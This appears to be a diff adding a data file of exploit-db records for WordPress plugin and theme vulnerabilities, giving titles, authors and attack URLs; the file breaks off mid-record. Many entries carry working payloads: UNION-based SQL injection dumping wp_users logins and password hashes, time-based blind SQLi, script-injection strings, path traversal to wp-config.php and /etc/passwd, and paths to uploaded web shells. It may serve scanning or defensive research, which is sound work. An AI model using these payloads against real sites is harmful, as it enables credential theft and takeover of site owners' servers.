@@ -1,0 +1,1456 @@
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/22463/
+Exploit Title: Wordpress Plugin Catalog HTML Code Injection and Cross-site scripting
+Author: Daniel Barragan 'D4NB4R'
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/22427/
+Exploit Title: Wordpress All Video Gallery 1.1 SQL Injection Vulnerability
+Author: Ashiyane Digital Security Team
+URL: /wp-content/plugins/all-video-gallery/config.php?vid=[SQL]
+URL: /wp-content/plugins/all-video-gallery/config.php?vid=1&amp;pid=11&amp;pid=-1+union+select+1,2,3,4,group_concat(user_login,0x3a,user_pass),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41+from+wp_users--
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/22396/
+Exploit Title: Wordpress plugins - bbpress Multiple Vulnerabilities
+Author: Dark-Puzzle (Souhail Hammou)
+URL: /wp-content/plugins/bbpress/forum.php?id=1&amp;page=[Inject here] 
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/22374/
+Author: Janek Vind 'waraxe'
+URL: /wp-admin/post.php?post=43&amp;action=edit
+URL: /wp-admin/admin-ajax.php?action=foxypress_download&amp;security=844b64ce45' method='post' enctype='multipart/form-data'&gt;
+URL: /wp-admin/edit.php?post_type=foxypress_product&amp;page=manage-emails&amp;mode=edit&amp;id=waraxe' method='post'&gt;
+URL: /wp-admin/edit.php?post_type=foxypress_product&amp;page=inventory-category' method='post'&gt;
+URL: /wp-admin/edit.php?post_type=foxypress_product&amp;page=inventory-category&amp;mode=delete&amp;category_id=waraxe
+URL: /wp-admin/edit.php?post_type=foxypress_product&amp;page=affiliate-management&amp;orderby=management_asset_name&amp;order=waraxe
+URL: /wp-admin/edit.php?post_type=foxypress_product&amp;page=affiliate-management&amp;mode=view_banner&amp;banner_id=waraxe
+URL: /wp-admin/edit.php?post_type=foxypress_product&amp;page=affiliate-management&amp;mode=view_banner&amp;banner_id=0+UNION+SELECT+1,1,(SELECT+CONCAT_WS(0x3a,user_login,user_pass)FROM+wp_users+WHERE+ID=1),1,1,1
+URL: /wp-admin/edit.php?post_type=foxypress_product&amp;page=affiliate-management&amp;mode=view_past_details&amp;affiliate_id=waraxe
+URL: /wp-admin/edit.php?post_type=foxypress_product&amp;page=affiliate-management&amp;mode=view_past_details&amp;affiliate_id=0+UNION+SELECT+1,1,1,1,1,1,1,1,(SELECT+CONCAT_WS(0x3a,user_login,user_pass)FROM+wp_users+WHERE+ID=1),1,1
+URL: /wp-admin/edit.php?post_type=foxypress_product&amp;page=reports&amp;report=2' method='post'&gt;
+URL: /wp-admin/edit.php?post_type=foxypress_product&amp;page=manage-emails&amp;mode=edit&amp;id=&lt;body+onload=alert(123);&gt;
+URL: /wp-content/plugins/foxypress/foxypress-affiliate.php?aff_id='&gt;&lt;script&gt;alert(123);&lt;/script&gt;
+URL: /wp-admin/edit.php?post_type=foxypress_product&amp;page=affiliate-signup
+URL: /wp-admin/edit.php?post_type=foxypress_product&amp;page=order-management&amp;status='&gt;&lt;/option&gt;&lt;/select&gt;&lt;script&gt;alert(123);&lt;/script&gt;
+URL: /wp-admin/edit.php?post_type=foxypress_product&amp;page=affiliate-management' method='post'&gt;
+URL: /wp-content/plugins/foxypress/foxypress-affiliate.php?url=http://php.net/
+URL: /wp-content/plugins/foxypress/Coupons.csv
+URL: /wp-content/plugins/foxypress/Export.csv
+URL: /wp-content/plugins/foxypress/Inventory.csv
+URL: /wp-admin/edit.php?post_type=foxypress_product&amp;page=affiliate-management&amp;mode=delete_banner&amp;banner_id=123
+URL: /wp-admin/edit.php?post_type=foxypress_product&amp;page=inventory-category&amp;mode=delete&amp;category_id=123
+URL: /wp-admin/edit.php?post_type=foxypress_product&amp;page=inventory-category&amp;mode=delete_image&amp;category_id=123
+URL: /wp-admin/edit.php?post_type=foxypress_product&amp;page=inventory-option-groups&amp;action=deleteoptiongroup&amp;optiongroupid=123
+URL: /wp-admin/edit.php?post_type=foxypress_product&amp;page=status-management&amp;action=delete&amp;status=123
+URL: /wp-admin/edit.php?post_type=foxypress_product&amp;page=order-management&amp;action=deletenote&amp;note=123
+URL: /wp-admin/edit.php?post_type=foxypress_product&amp;page=manage-emails&amp;action=delete&amp;id=123
+URL: /wp-content/plugins/foxypress/ajax.php?m=tracking&amp;id=123&amp;ln=doe
+URL: /wp-content/plugins/foxypress/ajax.php
+URL: /wp-content/plugins/foxypress/ajax.php?m=deletedownloadable&amp;sid=1jnd2u36vmvesa33jcsappmbs2&amp;inventoryid=foobar&amp;downloadableid=2
+URL: /wp-content/plugins/foxypress/custom-post-type.php
+URL: /wp-content/plugins/foxypress/foxypress-manage-emails.php
+URL: /wp-content/plugins/foxypress/foxypress-redirect.php
+URL: /wp-content/plugins/foxypress/foxypress-settings.php
+URL: /wp-content/plugins/foxypress/foxypress-templates.php
+URL: /wp-content/plugins/foxypress/foxypress.php
+URL: /wp-content/plugins/foxypress/import-export.php
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/22300/
+Exploit Title: Wordpress Easy Webinar Plugin Blind SQL Injection Vulnerability
+Author: Robert Cooper (robert.cooper [at] areyousecure.net)
+URL: /wp-content/plugins/webinar_plugin/get-widget.php?wid=[SQLi]
+URL: /wp-content/plugins/webinar_plugin/get-widget.php?wid=3' or 'x'='x
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/22158/
+Author: Janek Vind 'waraxe'
+URL: /wp-content/plugins/social-discussions/social-discussions-networkpub_ajax.php?HTTP_ENV_VARS[DOCUMENT_ROOT]=http://php.net/?
+URL: /wp-content/plugins/social-discussions/social-discussions-networkpub_ajax.php?HTTP_ENV_VARS[DOCUMENT_ROOT]=/proc/self/environ%00z
+URL: /wp-content/plugins/social-discussions/social-discussions-networkpub.php
+URL: /wp-content/plugins/social-discussions/social-discussions.php
+URL: /wp-content/plugins/social-discussions/social_discussions_service_names.php
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/22071/
+Exploit Title: Wordpress FireStorm Professional Real Estate 2.06.01 SQL Injection Vulnerability
+Author: Ashiyane Digital Security Team
+URL: /wp-content/plugins/fs-real-estate-plugin/xml/marker_listings.xml?id=[SQL]
+URL: /wp-content/plugins/fs-real-estate-plugin/xml/marker_listings.xml?id=1%20union%20all%20select%201,2,3,4,5,6,7,8,group_concat(user_login,char(58),user_pass,char(58),user_email),10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31 from wp_users--
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/21715/
+Exploit Title: Wordpress spider calendar Plugin Multiple Vulnerabilities
+Author: Daniel Barragan 'D4NB4R'
+URL: /wp-content/plugins/Calendar/front_end/spidercalendarbig.php?calendar_id=1&amp;cur_page_url=&amp;date=D4NB4R''()%26%251&lt;ScRiPt &gt;prompt()&lt;%2fScRiPt&gt;&amp;day=01&amp;ev_ids=1&amp;eventID=1&amp;theme_id=5
+URL: /wp-content/plugins/Calendar/front_end/spidercalendarbig_seemore.php?theme_id=5&amp;ev_ids=1&amp;calendar_id=null union all select 1,1,1,1,0x3c7363726970743e616c657274282244344e42345220576173204865726522293c2f7363726970743e,1,1,1,1,1,1,1,1,1,1,1,1+--+&amp;date=2012-10-10&amp;many_sp_calendar=1&amp;cur_page_url=http://127.0.0.1/spider-calendar/
+URL: /wp-content/plugins/Calendar/front_end/spidercalendarbig_seemore.php?theme_id=5&amp;ev_ids=1&amp;calendar_id=null union all select 1,1,1,1,version(),1,1,1,1,1,1,1,1,1,1,1,1+--+&amp;date=2012-10-10&amp;many_sp_calendar=1&amp;cur_page_url=
+URL: /wp-content/plugins/Calendar/front_end/spidercalendarbig_seemore.php?calendar_id=1&amp;ev_ids=1&amp;theme_id=5&amp;d4nb4r=d4nb4r
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/21646/
+Exploit Title: Archin WordPress Theme Unauthenticated Configuration Access
+Author: bwall (@bwallHatesTwits)
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/21393/
+Exploit Title: WP-TopBar 4.02 CSRF
+Author: Blake Entrekin
+URL: /wp-admin/admin.php?page=wp-topbar.php&amp;action=topbartext&amp;barid=1'
+Authenticated Stored XSS
+Author: Blake Entrekin
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/20918/
+Author: JoinSe7en [Team INTRA]                    |
+Exploit Title: Wordpress HD Webplayer 1.1 SQL Injection
+Author: JoinSe7en
+URL: /wp-content/plugins/hd-webplayer/config.php?id= [INJECT HERE]
+URL: /wp-content/plugins/hd-webplayer/playlist.php?videoid= [INJECT HERE]
+URL: /wp-content/plugins/hd-webplayer/config.php?id='
+URL: /wp-content/plugins/hd-webplayer/playlist.php?videoid='
+URL: /wp-content/plugins/hd-webplayer/'
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/20862/
+Exploit Title: wordpress Count per Day Cross Site Scripting Vulnerability
+URL: /wp-content/plugins/count-per-day
+Author: Crim3R
+URL: /wp-content/plugins/count-per-day/notes.php
+URL: /wp-content/plugins/count-per-day 
+URL: /wp-content/plugins/count-per-day/
+URL: /wp-content/plugins/count-per-day/
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/20474/
+Exploit Title: WordPress RSVPMaker v2.5.4 Persistent XSS
+Author: Chris Kellum
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/20416/
+Exploit Title: WordPress Mz-jajak plugin &lt;= 2.1 SQL Injection Vulnerability
+Author: StRoNiX
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/20365/
+Author: loneferret of Offensive Security
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/20361/
+Author: loneferret of Offensive Security
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/20360/
+Author: loneferret of Offensive Security
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/20358/
+Author: loneferret of Offensive Security
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/20083/
+Exploit Title: WordPress Front End Upload v0.5.4.4 Arbitrary PHP File Upload Vulnerability
+Author: Chris Kellum
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/19862/
+Exploit Title: Diary/Notebook Site5 Wordpress Theme - Email Spoofing
+Author: @bwallHatesTwits
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/19791/
+Exploit Title: WordPress Resume Submissions &amp; Job Postings v2.5.1 Unrestricted File Upload
+Author: Chris Kellum
+URL: /wp-content/plugins/resume-submissions-job-postings/includes/functions.php:
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/19715/
+Exploit Title: WordPress WP-Predict v1.0 Blind SQL Injection
+Author: Chris Kellum
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/19572/
+Exploit Title: WordPress MoodThingy Mood Rating Widget v0.8.7 Blind SQL Injection
+Author: Chris Kellum
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/19524/
+Exploit Title: WordPress Backup plugin exposes site data
+Author: Stephan Knauss
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/19481/
+Exploit Title: WordPress Paid Business Listings v1.0.2 Blind SQL Injection
+Author: Chris Kellum
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/19400/
+Exploit Title: WordPress Website FAQ Plugin v1.0 SQL Injection
+Author: Chris Kellum
+URL: /wp-content/plugins/website-faq/website-faq-widget.php
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/19398/
+URL: /wp-content/plugins/radykal-fancy-gallery/
+Author : Sammy FORGIT - sam at opensyscom dot fr - http://www.opensyscom.fr
+URL: /wp-content/plugins/radykal-fancy-gallery/admin/image-upload.php');
+URL: /wp-content/plugins/radykal-fancy-gallery/admin/
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/19294/
+Author: Henry Hoggard
+Author URL: henryhoggard.co.uk
+Author Twitter: @henryhoggard
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/19100/
+Author'         =&gt;
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/19058/
+Exploit Title: Wordpress Custom Content Type Manager 0.9.5.13-pl Arbitrary File Upload
+Author: Adrien Thierry
+URL: /wp-content/plugins/custom-content-type-manager/upload_form.php
+URL: /wp-content/plugins/custom-content-type-manager/upload_form.php
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/19057/
+Exploit Title: Wordpress drag and drop file upload 0.1 Arbitrary File Upload
+Author: Adrien Thierry
+URL: /wp-content/plugins/drag-drop-file-uploader/dnd-upload.php
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/19056/
+Exploit Title: Wordpress Mac Photo Gallery 2.7 Arbitrary File Upload
+Author: Adrien Thierry
+URL: /wp-content/plugins/mac-dock-gallery/upload-file.php
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/19055/
+Exploit Title: Wordpress Pica Photo Gallery 1.0 Arbitrary File Upload
+Author: Adrien Thierry
+URL: /wp-content/plugins/pica-photo-gallery/picaPhotosResize.php
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/19054/
+Exploit Title: Wordpress SfBrowser Version 1.4.5 Arbitrary File Upload
+Author: Adrien Thierry
+URL: /wp-content/plugins/sfbrowser/connectors/php/sfbrowser.php
+URL: /wp-content/plugins/sfbrowser/shell.ptxt
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/19053/
+Exploit Title: Wordpress Top Quark Architecture Version 2.10 Arbitrary File Upload
+Author: Adrien Thierry
+URL: /wp-content/plugins/topquark/lib/js/fancyupload/showcase/batch/script.php
+URL: /wp-content/plugins/topquark/lib/js/fancyupload/showcase/shell.php1
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/19052/
+Exploit Title: Wordpress User Meta Version 1.1.1 Arbitrary File Upload
+Author: Adrien Thierry
+URL: /wp-content/plugins/user-meta/framework/helper/uploader.php
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/19050/
+Exploit Title: Wordpress wp-gpx-map version 1.1.21 Arbitrary File Upload
+Author: Adrien Thierry
+URL: /wp-content/plugins/wp-gpx-maps/wp-gpx-maps_admin_tracks.php
+URL: /wp-content/plugins/wp-gpx-maps/wp-gpx-maps_admin_tracks.php?realGpxPath=.&amp;target_path=.&amp;gpxRegEx=//
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/19036/
+Exploit Title: Wordpress content-flow3d Arbitrary File Upload 
+Author: g11tch
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/19023/
+URL: /wp-content/plugins/wpstorecart/
+Author : Sammy FORGIT - sam at opensyscom dot fr - 
+URL: /wp-content/plugins/wpstorecart/php/upload.php');
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/19022/
+URL: /wp-content/plugins/tinymce-thumbnail-gallery/
+Author : Sammy FORGIT - sam at opensyscom dot fr - 
+URL: /wp-content/plugins/tinymce-thumbnail-gallery/php/download-image.php?href=../../../../wp-config.php
+URL: /wp-content/plugins/tinymce-thumbnail-gallery/php/download-image.php?href=../../../../../../../../etc/passwd 
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/19021/
+URL: /wp-content/plugins/thinkun-remind/
+Author : Sammy FORGIT - sam at opensyscom dot fr - 
+URL: /wp-content/plugins/thinkun-remind/exportData.php?dirPath=../../../../../../../etc/passwd%00
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/19020/
+URL: /wp-content/plugins/simple-download-button-shortcode/
+Author : Sammy FORGIT - sam at opensyscom dot fr - 
+URL: /wp-content/plugins/simple-download-button-shortcode/simple-download-button_dl.php?file=../../../../wp-config.php
+URL: /wp-content/plugins/simple-download-button-shortcode/simple-download-button_dl.php?file=../../../../../../../../etc/passwd
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/19019/
+URL: /wp-content/plugins/rbxgallery/
+Author : Sammy FORGIT - sam at opensyscom dot fr - 
+URL: /wp-content/plugins/rbxgallery/uploader.php');
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/19018/
+URL: /wp-content/plugins/plugin-newsletter/
+Author : Sammy FORGIT - sam at opensyscom dot fr - 
+URL: /wp-content/plugins/plugin-newsletter/preview.php?data=../../../../wp-config.php
+URL: /wp-content/plugins/plugin-newsletter/preview.php?data=../../../../../../../../etc/passwd
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/19016/
+URL: /wp-content/plugins/pica-photo-gallery/
+Author : Sammy FORGIT - sam at opensyscom dot fr - 
+URL: /wp-content/plugins/pica-photo-gallery/picadownload.php?imgname=../../../wp-config.php
+URL: /wp-content/plugins/pica-photo-gallery/picadownload.php?imgname=../../../../../../../etc/passwd 
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/19013/
+URL: /wp-content/plugins/easy-contact-forms-exporter/
+Author : Sammy FORGIT - sam at opensyscom dot fr - 
+URL: /wp-content/plugins/easy-contact-forms-exporter/downloadcsv.php?file=../etc/passwd 
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/19012/
+Exploit Title: Wordpress front file manager 0.1 Arbitrary File Upload
+Author: Adrien Thierry 
+URL: /wp-content/plugins/uploads/2012/06/shell.php
+URL: /wp-content/plugins/uploads/[YYYY]/[MM]/shell.php
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/19009/
+Exploit Title: Wordpress Omni-secure-files 0.1.13 Arbitrary File Upload
+Author: Adrien Thierry
+URL: /wp-content/plugins/omni-secure-files/plupload/examples/uploads/shell.php
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/19008/
+Exploit Title: Wordpress front-end-upload 0.5.3 Arbitrary File Upload
+Author: Adrien Thierry
+URL: /wp-content/plugins/front-end-upload/FEU_DESTINATION_DIR/shell.php
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/18998/
+URL: /wp-content/plugins/gallery-plugin/
+Author : Sammy FORGIT - sam at opensyscom dot fr - 
+URL: /wp-content/plugins/gallery-plugin/upload/php.php');
+URL: /wp-content/plugins/gallery-plugin/upload/files/lo.php.gif
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/18997/
+URL: /wp-content/plugins/mm-forms-community/
+Author : Sammy FORGIT - sam at opensyscom dot fr - 
+URL: /wp-content/plugins/mm-forms-community/includes/doajaxfileupload.php');
+URL: /wp-content/plugins/mm-forms-community/upload/temp/
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/18994/
+URL: /wp-content/plugins/font-uploader/
+Author : Sammy FORGIT - sam at opensyscom dot fr -
+URL: /wp-content/plugins/font-uploader/font-upload.php');
+URL: /wp-content/plugins/font-uploader/fonts/lo.php.ttf
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/18993/
+URL: /wp-content/plugins/asset-manager/
+Author : Sammy FORGIT - sam at opensyscom dot fr - 
+URL: /wp-content/plugins/asset-manager/upload.php');
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/18991/
+URL: /wp-content/plugins/foxypress/
+Author : Sammy FORGIT - sam at opensyscom dot fr - 
+URL: /wp-content/plugins/foxypress/uploadify/uploadify.php');
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/18990/
+URL: /wp-content/plugins/html5avmanager/
+Author : Sammy FORGIT - sam at opensyscom dot fr - 
+URL: /wp-content/plugins/html5avmanager/lib/uploadify/custom.php');
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/18989/
+URL: /wp-content/plugins/store-locator-le/
+Author : Sammy FORGIT - sam at opensyscom dot fr - 
+URL: /wp-content/plugins/store-locator-le/core/load_wp_config.php
+URL: /wp-content/plugins/store-locator-le/core/send-email.php?email_name=test&amp;email_from=test@test.com&amp;email_to=test@exemple.com&amp;email_subject=test&amp;email_message=test
+URL: /wp-content/plugins/store-locator-le/downloadcsv.php');
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/18988/
+URL: /wp-content/plugins/wpmarketplace/
+Author : Sammy FORGIT - sam at opensyscom dot fr - 
+URL: /wp-content/plugins/wpmarketplace/uploadify/uploadify.php');
+URL: /wp-content/plugins/wpmarketplace/uploadify/'));
+URL: /wp-content/plugins/wpmarketplace/uploadify/
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/18987/
+URL: /wp-content/plugins/wp-property/
+Author : Sammy FORGIT - sam at opensyscom dot fr - 
+URL: /wp-content/plugins/wp-property/third-party/uploadify/uploadify.php');
+URL: /wp-content/plugins/wp-property/third-party/uploadify/'));
+URL: /wp-content/plugins/wp-property/third-party/uploadify/lo.php
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/18806/
+Exploit Title: Wordpress Zingiri Web Shop Plugin &lt;= 2.4.0 Stored XSS
+Author: Mehmet Ince
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/18791/
+Exploit Title     : Wordpress 3.3.1 Multiple CSRF Vulnerabilities 
+Author            : Ivano Binetti (http://www.ivanobinetti.com)
+URL: /wp-admin/admin-ajax.php'&gt;
+URL: /wp-admin/user-new.php'&gt;
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/18787/
+Exploit Title: Wordpress Zingiri Web Shop Plugin &lt;= 2.4.0 Multiple XSS
+Author: Mehmet INCE
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/18690/
+Exploit Title: Buddypress plugin of Wordpress remote SQL Injection
+Author: Ivan Terkin
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/18417/
+URL: /wp-admin/setup-config.php?step=2 HTTP/1.1
+URL: /wp-admin/setup-config.php?step=1
+URL: /wp-admin/install.php HTTP/1.1
+URL: /wp-admin/setup-config.php?step=2
+URL: /wp-admin/setup-config.php?step=2 HTTP/1.1
+URL: /wp-admin/setup-config.php?step=1
+URL: /wp-admin/setup-config.php?step=2 HTTP/1.1
+URL: /wp-admin/setup-config.php?step=1
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/18412/
+Author will be not responsible for any damage. |
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/18407/
+Exploit Title: AllWebMenus WordPress Menu Plugin Arbitrary file upload
+Author: 6Scan (http://6scan.com) security team
+URL: /wp-content/plugins/allwebmenus-wordpress-menu-plugin/actions.php' method=post enctype='multipart/form-data'&gt;
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/18390/
+Exploit Title: Wordpress uCan Post plugin &lt;= 1.0.09 Stored XSS
+URL: /wp-content/plugins/ucan-post/
+Author: Gianluca Brindisi (gATbrindi.si @gbrindisi http://brindi.si/g/)
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/18355/
+Exploit Title: Count-per-day Wordpress plugin Arbitrary file download and XSS
+Author 6Scan (http://6scan.com) security team
+URL: /wp-content/plugins/count-per-day/download.php?n=1&amp;f=/etc/passwd
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/18353/
+Exploit Title: WordPress wp-autoyoutube plugin Blind SQL Injection
+Author: longrifle0x
+URL: /wp-content/plugins/wp-autoyoutube/modules/index.php[GET][id=-1][CURRENT_USER()
+URL: /wp-content/plugins/wp-autoyoutube/modules/index.php[GET][id=-1][SELECT(CASE
+URL: /wp-content/plugins/wp-autoyoutube/modules/index.php[GET][id=-1][MID((VERSION()),1,6)
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/18350/
+Exploit Title: Wordpress Age Verification plugin &lt;= 0.4 Open Redirect
+Author: Gianluca Brindisi (gATbrindi.si @gbrindisi http://brindi.si/g/)
+URL: /wp-content/plugins/age-verification/age-verification.php?redirect_to=http%3A%2F%2Fwww.evil.com
+URL: /wp-content/plugins/age-verification/age-verification.php
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/18330/
+Exploit Title: Wordpress Pay With Tweet plugin &lt;= 1.1 Multiple Vulnerabilities
+Author: Gianluca Brindisi (gATbrindi.si @gbrindisi http://brindi.si/g/)
+URL: /wp-content/plugins/pay-with-tweet.php/pay.php    
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/18276/
+Exploit Title: Mailing List plugin for Wordpress Arbitrary file download
+Author: 6Scan (http://6scan.com) security team
+URL: /wp-content/plugins/mailz/lists/dl.php?wph=localhost&amp;wpdb=test&amp;user=root&amp;wpp=root&amp;id=0
+URL: /wp-content/plugins/mailz/lists/dl.php?id=1
+URL: /wp-content/plugins/mailz/lists/dl.php?id=2
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/18231/
+Exploit Title: BLIND SQL injection UPM-POLLS wordpress plugin 1.0.4
+Author: Saif El-Sherei
+URL: /wp-admin/admin-ajax.php?action=upm_ayax_polls_result&amp;do=result&amp;post=1&amp;type=general&amp;PID=2and
+URL: /wp-admin/admin-ajax.php?action=upm_ayax_polls_result&amp;do=result&amp;post=1&amp;type=general&amp;PID=2and
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/18126/
+Exploit Title: WordPress jetpack plugin SQL Injection Vulnerability
+Author: longrifle0x
+URL: /wp-content/plugins/jetpack/modules/sharedaddy.php
+URL: /wp-content/plugins/jetpack/modules/sharedaddy.php
+URL: /wp-content/plugins/jetpack/modules/sharedaddy.php
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/18114/
+Exploit Title: WordPress AdRotate plugin &lt;= 3.6.6 SQL Injection Vulnerability
+Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+URL: /wp-content/plugins/adrotate/adrotate-out.php?track=MScgQU5EIDE9SUYoMj4xLEJFTkNITUFSSyg1MDAwMDAwLE1ENShDSEFSKDExNSwxMTMsMTA4LDEwOSw5NywxMTIpKSksMCkj
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/18111/
+Author will be not responsible for any damage. |
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/18055/
+Exploit Title: WordPress WP Glossary plugin SQL Injection Vulnerability
+Author: longrifle0x
+URL: /wp-content/plugins/wp-glossary/ajax.php
+URL: /wp-content/plugins/wp-glossary/ajax.php
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/18053/
+Exploit Title: WordPress Classipress Theme &lt;= 3.1.4 Stored XSS
+Author: Paul Loftness
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/18039/
+Exploit Title: WordPress wptouch plugin SQL Injection Vulnerability
+Author: longrifle0x
+URL: /wp-content/plugins/wptouch/ajax.php
+URL: /wp-content/plugins/wptouch/ajax.php][GET][id=-1][CURRENT_USER()
+URL: /wp-content/plugins/wptouch/ajax.php][GET][id=-1][SELECT
+URL: /wp-content/plugins/wptouch/ajax.php][GET][id=-1][MID((VERSION()),1,6)
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17980/
+Exploit Title: WordPress Contact Form plugin &lt;= 2.7.5 SQL Injection Vulnerability
+Author: Skraps (jackie.craig.sparks(at)live.com jackie.craig.sparks(at)gmail.com @skraps_foo)
+URL: /wp-content/plugins/contact-form-wordpress/easy-form.class.php 
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17973/
+Exploit Title: WordPress GD Star Rating plugin &lt;= 1.9.10 SQL Injection Vulnerability
+Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+URL: /wp-content/plugins/gd-star-rating/export.php?ex=user&amp;us=dummy&amp;de=-1' AND 1=IF(2&gt;1,BENCHMARK(5000000,MD5(CHAR(115,113,108,109,97,112))),0)--%20
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17970/
+Exploit Title:[ WordPress wpsf-js plugin, SQL Injection]
+Author: [cheki]
+URL: /wp-content/plugins/wp-spamfree/js/wpsf-js.php?id=1
+URL: /wp-content/plugins/wp-spamfree/js/wpsf-js.php][GET][id=-1][CURRENT_USER()
+URL: /wp-content/plugins/wp-spamfree/js/wpsf-js.php][GET][id=-1][SELECT (CASE WHEN ((SELECT super_priv FROM
+URL: /wp-content/plugins/wp-spamfree/js/wpsf-js.php][GET][id=-1][MID((VERSION()),1,6)
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17906/
+Exploit Title: WordPress WP Bannerize plugin &lt;= 2.8.7 SQL Injection Vulnerability
+Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+URL: /wp-content/plugins/wp-bannerize/ajax_sorter.php
+URL: /wp-content/plugins/wp-bannerize/ajax_sorter.php
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17894/
+Exploit Title: WordPress Mingle Forum plugin &lt;= 1.0.31 SQL Injection Vulnerability
+Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+URL: /wp-content/plugins/mingle-forum/wpf-insert.php
+URL: /wp-content/plugins/mingle-forum/wpf-insert.php
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17891/
+URL: /wp-content/plugins/cevhershare/cevhershare-admin.php?id=[SQL-Injection]
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17888/
+Exploit Title: WordPress AdRotate plugin &lt;= 3.6.5 SQL Injection Vulnerability
+Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+URL: /wp-content/plugins/adrotate/adrotate-out.php?track=1' AND 1=IF(2&gt;1,BENCHMARK(5000000,MD5(CHAR(115,113,108,109,97,112))),0)%23
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17887/
+Exploit Title: WordPress Link Library plugin &lt;= 5.2.1 SQL Injection Vulnerability
